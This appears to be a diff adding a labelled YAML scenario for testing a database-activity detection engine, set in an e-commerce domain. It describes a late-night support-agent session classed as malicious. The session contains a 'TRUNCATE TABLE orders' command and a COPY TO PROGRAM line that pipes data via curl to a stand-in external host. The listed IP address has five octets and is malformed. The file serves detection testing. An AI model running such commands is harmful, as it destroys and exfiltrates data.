@@ -1,0 +1,23 @@
+scenario_id: gen_ecommerce_25_data_tamper_mal_641
+family_id: gen_ecommerce_25_data_tamper_mal_fam641
+domain: ecommerce
+time_of_day: 01:50
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: support_agent
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 0.5
+  events:
+  - step_id: act
+    sql: TRUNCATE TABLE orders
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://sync.partner-mirror.example/ingest
+      -d @-'
+    connects_to:
+      ip: 185.220.101.147.61
+      port: 8080
